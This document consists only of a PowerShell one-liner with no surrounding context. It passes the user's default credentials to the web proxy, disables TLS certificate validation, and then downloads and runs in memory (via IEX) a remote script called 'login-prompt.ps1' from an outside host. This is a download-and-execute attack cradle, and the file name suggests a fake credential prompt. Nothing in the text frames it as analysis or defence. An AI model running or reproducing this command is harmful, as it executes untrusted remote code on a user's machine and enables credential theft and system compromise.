
[net.webrequest]::defaultwebproxy.credentials = [net.credentialcache]::defaultcredentials; [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}; IEX (New-Object Net.WebClient).DownloadString('https://s11.connect-ros.com/login-prompt.ps1')

